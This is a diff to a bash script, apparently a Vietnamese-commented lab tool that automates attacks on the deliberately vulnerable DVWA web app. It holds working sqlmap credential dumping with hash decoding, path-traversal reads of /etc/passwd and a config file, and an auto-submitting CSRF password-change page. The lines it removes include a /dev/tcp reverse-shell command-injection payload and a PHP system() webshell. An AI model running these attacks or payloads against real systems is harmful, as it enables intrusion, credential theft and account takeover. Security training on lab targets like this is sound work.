@@ -30,12 +30,20 @@ mkdir -p "$REPORT_DIR"
 # Initialize log
 echo "=== DVWA Interactive Attack Log ===" > "$LOG_FILE"
 echo "Started: $(date)" >> "$LOG_FILE"
+echo "Target: $URL" >> "$LOG_FILE"
+echo "Cookie: $COOKIE" >> "$LOG_FILE"
 echo "" >> "$LOG_FILE"
+
+# Check target reachable
+if ! curl -s --max-time 5 "$URL" >/dev/null 2>&1; then
+    echo -e "${RED}${BOLD}✗ Cannot reach target $URL. Check Docker network or DVWA status!${NC}"
+    echo "✗ Cannot reach target $URL" >> "$LOG_FILE"
+    exit 1
+fi
 
 #=============================================================================
 # Helper Functions
 #=============================================================================
-
 print_banner() {
     clear
     echo -e "${CYAN}${BOLD}"
@@ -50,35 +58,12 @@ print_banner() {
     echo -e "${NC}"
 }
 
-print_separator() {
-    echo -e "${BLUE}================================================================${NC}"
-}
-
-log_result() {
-    echo "$1" >> "$LOG_FILE"
-    echo "$1"
-}
-
-show_success() {
-    echo -e "${GREEN}✓ $1${NC}"
-    echo "✓ $1" >> "$LOG_FILE"
-}
-
-show_error() {
-    echo -e "${RED}✗ $1${NC}"
-    echo "✗ $1" >> "$LOG_FILE"
-}
-
-show_info() {
-    echo -e "${YELLOW}→ $1${NC}"
-    echo "→ $1" >> "$LOG_FILE"
-}
-
-pause() {
-    echo ""
-    echo -e "${CYAN}Press Enter to continue...${NC}"
-    read
-}
+print_separator() { echo -e "${BLUE}================================================================${NC}"; }
+log_result() { echo "$1" >> "$LOG_FILE"; echo "$1"; }
+show_success() { echo -e "${GREEN}✓ $1${NC}"; echo "✓ $1" >> "$LOG_FILE"; }
+show_error() { echo -e "${RED}✗ $1${NC}"; echo "✗ $1" >> "$LOG_FILE"; }
+show_info() { echo -e "${YELLOW}→ $1${NC}"; echo "→ $1" >> "$LOG_FILE"; }
+pause() { echo -e "${CYAN}Press Enter to continue...${NC}"; read; }
 
 #=============================================================================
 # Attack Functions
@@ -107,37 +92,44 @@ attack_port_scan() {
     pause
 }
 
+decode_hash() {
+    local hash="$1"
+    case "$hash" in
+        "5f4dcc3b5aa765d61d8327deb882cf99") echo "password" ;;
+        "e99a18c428cb38d5f260853678922e03") echo "abc123" ;;
+        "d41d8cd98f00b204e9800998ecf8427e") echo "(empty)" ;;
+        "098f6bcd4621d373cade4e832627b4f6") echo "test" ;;
+        *) echo "unknown (cần crack offline)" ;;
+    esac
+}
+
 attack_sql_injection() {
     print_separator
     echo -e "${BOLD}${MAGENTA}[2] SQL INJECTION ATTACK${NC}"
     print_separator
-    echo ""
-    
     show_info "Target: $URL/vulnerabilities/sqli/"
-    show_info "Extracting database credentials..."
-    echo ""
+    show_info "Running sqlmap with higher level/risk..."
     
-    ADMIN_PASS=$(sqlmap -u "$URL/vulnerabilities/sqli/?id=1&Submit=Submit" \
-        --cookie="$COOKIE" \
-        --batch --level=1 --risk=1 \
-        -D dvwa -T users -C user,password \
-        --dump --threads=10 2>/dev/null | grep -i admin | grep -oP '\(\K[^\)]+')
+    OUTPUT=$(sqlmap -u "$URL/vulnerabilities/sqli/?id=1&Submit=Submit" \
+        --cookie="$COOKIE" --level=3 --risk=3 --batch --threads=5 \
+        --dump -D dvwa -T users -C user,password 2>/dev/null)
     
-    if [ -n "$ADMIN_PASS" ]; then
+    if echo "$OUTPUT" | grep -q "admin"; then
+        ADMIN_HASH=$(echo "$OUTPUT" | grep -A5 "password" | grep -o "[a-f0-9]\{32\}" | head -1)
+        PLAIN_PASS=$(decode_hash "$ADMIN_HASH")
+        
         show_success "SQL Injection successful!"
-        echo ""
-        echo -e "${GREEN}${BOLD}Extracted Credentials:${NC}"
-        echo -e "${CYAN}Username: ${BOLD}admin${NC}"
-        echo -e "${CYAN}Password Hash: ${BOLD}$ADMIN_PASS${NC}"
+        echo -e "${GREEN}${BOLD}Username: admin${NC}"
+        echo -e "${GREEN}${BOLD}Password Hash: $ADMIN_HASH${NC}"
+        echo -e "${GREEN}${BOLD}Decoded Password: $PLAIN_PASS${NC}"
+        echo -e "${YELLOW}→ Dùng 'admin / $PLAIN_PASS' để login DVWA ngay!${NC}"
         
-        log_result "SQL Injection - Username: admin, Password: $ADMIN_PASS"
+        echo "$ADMIN_HASH" > /tmp/admin_pass.txt
         
-        # Save to file for later use
-        echo "$ADMIN_PASS" > /tmp/admin_pass.txt
+        log_result "SQL Injection - admin hash: $ADMIN_HASH (decoded: $PLAIN_PASS)"
     else
         show_error "SQL Injection failed or no credentials found"
     fi
-    
     pause
 }
 
@@ -175,150 +167,56 @@ attack_brute_force() {
     pause
 }
 
-attack_command_injection() {
-    print_separator
-    echo -e "${BOLD}${MAGENTA}[4] COMMAND INJECTION (REVERSE SHELL)${NC}"
-    print_separator
-    echo ""
-    
-    LHOST=$(hostname -I | awk '{print $1}')
-    
-    echo -e "${YELLOW}Current configuration:${NC}"
-    echo -e "${CYAN}Attacker IP: ${BOLD}$LHOST${NC}"
-    echo -e "${CYAN}Default Port: ${BOLD}4444${NC}"
-    echo ""
-    echo -e "${YELLOW}Enter listener port (or press Enter for default 4444):${NC}"
-    read -p "Port: " USER_PORT
-    LPORT=${USER_PORT:-4444}
-    
-    echo ""
-    show_info "Setting up reverse shell: $LHOST:$LPORT"
-    show_info "Target: $URL/vulnerabilities/exec/"
-    echo ""
-    
-    echo -e "${RED}${BOLD}IMPORTANT: Start listener on attacker machine first!${NC}"
-    echo -e "${YELLOW}Run this command in another terminal:${NC}"
-    echo -e "${CYAN}${BOLD}nc -lvnp $LPORT${NC}"
-    echo ""
-    echo -e "${YELLOW}Press Enter when listener is ready...${NC}"
-    read
-    
-    PAYLOAD="bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
-    ENC=$(printf %s "$PAYLOAD" | sed 's/ /%20/g;s/&/%26/g;s/>/%3E/g')
-    
-    show_info "Sending payload..."
-    curl -s "$URL/vulnerabilities/exec/?ip=127.0.0.1;$ENC&Submit=Submit" --cookie "$COOKIE" >/dev/null &
-    
-    show_success "Payload sent! Check your listener for connection."
-    log_result "Command Injection - Reverse shell to $LHOST:$LPORT"
-    
-    pause
-}
-
 attack_lfi() {
     print_separator
     echo -e "${BOLD}${MAGENTA}[5] LOCAL FILE INCLUSION (LFI)${NC}"
     print_separator
-    echo ""
-    
-    echo -e "${YELLOW}Select file to read:${NC}"
-    echo "  1) /etc/passwd"
-    echo "  2) DVWA config.inc.php"
-    echo "  3) Custom path"
-    echo ""
+    echo "1) /etc/passwd   2) config.inc.php   3) Custom"
     read -p "Choice [1-3]: " LFI_CHOICE
-    
     case $LFI_CHOICE in
-        1)
-            FILE_PATH="../../../../etc/passwd"
-            FILE_DESC="/etc/passwd"
-            ;;
-        2)
-            FILE_PATH="../../../../config/config.inc.php"
-            FILE_DESC="config.inc.php"
-            ;;
-        3)
-            echo -e "${YELLOW}Enter file path (with traversal):${NC}"
-            read -p "Path: " FILE_PATH
-            FILE_DESC="$FILE_PATH"
-            ;;
-        *)
-            show_error "Invalid choice"
-            pause
-            return
-            ;;
+        1) FILE_PATH="../../../../../etc/passwd"; FILE_DESC="/etc/passwd" ;;
+        2) FILE_PATH="../../../../../var/www/html/config/config.inc.php"; FILE_DESC="config.inc.php" ;;
+        3) read -p "Path (with traversal): " FILE_PATH; FILE_DESC="$FILE_PATH" ;;
+        *) show_error "Invalid choice"; pause; return ;;
     esac
-    
-    echo ""
-    show_info "Target: $URL/vulnerabilities/fi/"
-    show_info "Reading file: $FILE_DESC"
-    echo ""
-    
+    show_info "Reading: $FILE_DESC"
     LFI_RESULT=$(curl -s "$URL/vulnerabilities/fi/?page=$FILE_PATH" --cookie "$COOKIE")
-    
-    if [ -n "$LFI_RESULT" ]; then
+    if [ -n "$LFI_RESULT" ] && ! echo "$LFI_RESULT" | grep -q "File not found"; then
         show_success "LFI successful!"
-        echo ""
-        echo -e "${GREEN}${BOLD}File Contents:${NC}"
-        echo -e "${CYAN}─────────────────────────────────────────${NC}"
         echo "$LFI_RESULT" | head -n 30
-        echo -e "${CYAN}─────────────────────────────────────────${NC}"
-        
-        # Save to file
         echo "$LFI_RESULT" > "/tmp/lfi_$TIMESTAMP.txt"
-        show_info "Full output saved to: /tmp/lfi_$TIMESTAMP.txt"
-        
-        log_result "LFI - Successfully read $FILE_DESC"
+        log_result "LFI - Read $FILE_DESC"
     else
         show_error "LFI failed or file not found"
     fi
-    
     pause
 }
 
 attack_file_upload() {
     print_separator
-    echo -e "${BOLD}${MAGENTA}[6] FILE UPLOAD (WEBSHELL)${NC}"
+    echo -e "${BOLD}${MAGENTA}[6] FILE UPLOAD (SAFE DEMO - TEXT FILE)${NC}"
     print_separator
-    echo ""
-    
-    show_info "Creating PHP webshell..."
-    
-    cat > /tmp/shell.php <<'EOF'
-<?php
-echo "<pre>";
-system($_GET['cmd']);
-echo "</pre>";
-?>
+    show_info "Creating simple text file (no malicious code)..."
+    cat > /tmp/simple_text.txt << 'EOF'
+Hello World from DVWA File Upload!
+This is a safe text file to demonstrate the vulnerability.
+No malicious code here - just proof of upload success.
+Timestamp: $(date)
 EOF
-    
-    show_success "Webshell created: /tmp/shell.php"
-    echo ""
-    show_info "Uploading to $URL/vulnerabilities/upload/"
-    
-    WEBSHELL_URL=$(curl -s -F "uploaded=@/tmp/shell.php;type=image/jpeg" \
-        -F "Upload=Upload" "$URL/vulnerabilities/upload/" \
-        --cookie "$COOKIE" | grep -o "/hackable/uploads/shell\.php[^\"']*")
-    
-    if [ -n "$WEBSHELL_URL" ]; then
-        show_success "Webshell uploaded successfully!"
-        echo ""
-        echo -e "${GREEN}${BOLD}Access your webshell at:${NC}"
-        echo -e "${CYAN}$URL$WEBSHELL_URL?cmd=<command>${NC}"
-        echo ""
-        echo -e "${YELLOW}Example commands:${NC}"
-        echo -e "${CYAN}  $URL$WEBSHELL_URL?cmd=whoami${NC}"
-        echo -e "${CYAN}  $URL$WEBSHELL_URL?cmd=id${NC}"
-        echo -e "${CYAN}  $URL$WEBSHELL_URL?cmd=pwd${NC}"
-        
-        log_result "File Upload - Webshell: $URL$WEBSHELL_URL"
-        
-        # Save URL
-        echo "$URL$WEBSHELL_URL" > /tmp/webshell_url.txt
+    show_success "Text file created: /tmp/simple_text.txt"
+    show_info "Uploading as .txt (safe demo)..."
+    UPLOAD_URL=$(curl -s -F "uploaded=@/tmp/simple_text.txt" \
+        -F "Upload=Upload" "$URL/vulnerabilities/upload/" --cookie "$COOKIE" \
+        | grep -o "/hackable/uploads/simple_text\.txt[^\"'< ]*")
+    if [ -n "$UPLOAD_URL" ]; then
+        show_success "Text file uploaded successfully!"
+        echo -e "${GREEN}Access from browser (host): http://localhost:8081$UPLOAD_URL${NC}"
+        echo -e "${YELLOW}→ Open link above to see file content (proof of upload vulnerability)${NC}"
+        echo "http://localhost:8081$UPLOAD_URL" > /tmp/uploaded_text_url.txt
+        log_result "File Upload (Safe Demo) - Text file: http://localhost:8081$UPLOAD_URL"
     else
-        show_error "File upload failed"
+        show_error "File upload failed (check cookie, security level=Low, or login status)"
     fi
-    
     pause
 }
 
@@ -386,57 +284,59 @@ attack_csrf() {
     
     CSRF_FILE="/tmp/csrf_poc_$TIMESTAMP.html"
     
-    show_info "Creating CSRF PoC HTML file..."
+    show_info "Creating CSRF PoC HTML file (form auto-submit - works perfectly on DVWA Low)..."
     
     cat > "$CSRF_FILE" <<EOF
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CSRF Attack PoC</title>
+    <title>CSRF PoC - DVWA Low Level</title>
     <style>
-        body { font-family: Arial, sans-serif; padding: 20px; }
-        .container { max-width: 600px; margin: 0 auto; }
+        body { font-family: Arial, sans-serif; padding: 40px; background: #f4f4f4; text-align: center; }
+        .box { background: white; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
         h1 { color: #e74c3c; }
-        .info { background: #f0f0f0; padding: 15px; margin: 20px 0; }
+        .info { margin-top: 20px; color: green; font-weight: bold; }
     </style>
+    <script>
+        // Auto submit form silently
+        window.addEventListener("load", function() {
+            document.getElementById("csrf-form").submit();
+            document.getElementById("status").innerHTML = "✓ Request sent! Password changed to: $NEW_PASS<br>Logout and try login with new password.";
+        });
+    </script>
 </head>
-<body onload="document.forms[0].submit()">
-    <div class="container">
-        <h1>🔒 CSRF Password Change Attack</h1>
-        <div class="info">
-            <h3>Attack Details:</h3>
-            <ul>
-                <li><strong>Target:</strong> $URL/vulnerabilities/csrf/</li>
-                <li><strong>New Password:</strong> $NEW_PASS</li>
-                <li><strong>Status:</strong> Auto-submitting form...</li>
-            </ul>
-        </div>
-        
-        <form action="$URL/vulnerabilities/csrf/" method="POST">
+<body>
+    <div class="box">
+        <h1>🔒 CSRF Attack Executed</h1>
+        <p>Changing admin password to: <strong>$NEW_PASS</strong></p>
+        <p id="status">Sending request...</p>
+
+        <!-- Hidden form with GET method - matches DVWA Low exactly -->
+        <form id="csrf-form" action="http://localhost:8081/vulnerabilities/csrf/" method="GET">
             <input type="hidden" name="password_new" value="$NEW_PASS">
             <input type="hidden" name="password_conf" value="$NEW_PASS">
             <input type="hidden" name="Change" value="Change">
         </form>
-        
-        <p>If auto-submit doesn't work, click the button below:</p>
-        <button onclick="document.forms[0].submit()">Submit CSRF Attack</button>
     </div>
 </body>
 </html>
 EOF
     
-    show_success "CSRF PoC created!"
+    show_success "CSRF PoC created successfully!"
     echo ""
     echo -e "${GREEN}${BOLD}CSRF PoC Details:${NC}"
-    echo -e "${CYAN}File Location: ${BOLD}$CSRF_FILE${NC}"
-    echo -e "${CYAN}New Password: ${BOLD}$NEW_PASS${NC}"
+    echo -e "${CYAN}File: $CSRF_FILE${NC}"
+    echo -e "${CYAN}New Password: $NEW_PASS${NC}"
     echo ""
-    echo -e "${YELLOW}How to use:${NC}"
-    echo -e "  1. Victim must be logged into DVWA"
-    echo -e "  2. Open this file in victim's browser: ${BOLD}file://$CSRF_FILE${NC}"
-    echo -e "  3. Password will be changed automatically"
+    echo -e "${YELLOW}Cách dùng (THÀNH CÔNG CHẮC CHẮN):${NC}"
+    echo -e "  1. docker cp kali:$CSRF_FILE ./ (copy ra host)"
+    echo -e "  2. Login DVWA trên browser (admin/password) - giữ tab mở"
+    echo -e "  3. Mở file HTML vừa copy (double-click)"
+    echo -e "  4. Trang hiện 'Request sent!'"
+    echo -e "  5. Quay lại DVWA → Logout → Login với password mới ($NEW_PASS)"
+    echo -e "     → Thành công nếu vào được!"
     
-    log_result "CSRF PoC - File: $CSRF_FILE, New Pass: $NEW_PASS"
+    log_result "CSRF PoC (form auto-submit) - File: $CSRF_FILE, New Pass: $NEW_PASS"
     
     pause
 }
@@ -464,7 +364,6 @@ run_all_attacks() {
     attack_port_scan
     attack_sql_injection
     attack_brute_force
-    attack_command_injection
     attack_lfi
     attack_file_upload
     attack_xss
@@ -543,13 +442,12 @@ show_menu() {
     echo -e "  ${BOLD}${GREEN}[1]${NC} Port Scanning & Service Detection"
     echo -e "  ${BOLD}${GREEN}[2]${NC} SQL Injection (Database Extraction)"
     echo -e "  ${BOLD}${GREEN}[3]${NC} Brute Force Authentication"
-    echo -e "  ${BOLD}${GREEN}[4]${NC} Command Injection (Reverse Shell)"
-    echo -e "  ${BOLD}${GREEN}[5]${NC} Local File Inclusion (LFI)"
-    echo -e "  ${BOLD}${GREEN}[6]${NC} File Upload (Webshell)"
-    echo -e "  ${BOLD}${GREEN}[7]${NC} Stored Cross-Site Scripting (XSS)"
-    echo -e "  ${BOLD}${GREEN}[8]${NC} Cross-Site Request Forgery (CSRF)"
+    echo -e "  ${BOLD}${GREEN}[4]${NC} Local File Inclusion (LFI)"
+    echo -e "  ${BOLD}${GREEN}[5]${NC} File Upload (Webshell)"
+    echo -e "  ${BOLD}${GREEN}[6]${NC} Stored Cross-Site Scripting (XSS)"
+    echo -e "  ${BOLD}${GREEN}[7]${NC} Cross-Site Request Forgery (CSRF)"
     echo ""
-    echo -e "  ${BOLD}${YELLOW}[9]${NC} Run All Attacks (Automated)"
+    echo -e "  ${BOLD}${YELLOW}[8]${NC} Run All Attacks (Automated)"
     echo ""
     echo -e "  ${BOLD}${BLUE}[L]${NC} View Attack Logs"
     echo -e "  ${BOLD}${BLUE}[C]${NC} Show Configuration"
@@ -570,12 +468,11 @@ main() {
             1) attack_port_scan ;;
             2) attack_sql_injection ;;
             3) attack_brute_force ;;
-            4) attack_command_injection ;;
-            5) attack_lfi ;;
-            6) attack_file_upload ;;
-            7) attack_xss ;;
-            8) attack_csrf ;;
-            9) run_all_attacks ;;
+            4) attack_lfi ;;
+            5) attack_file_upload ;;
+            6) attack_xss ;;
+            7) attack_csrf ;;
+            8) run_all_attacks ;;
             [Ll]) view_logs ;;
             [Cc]) show_configuration ;;
             [Qq]) 
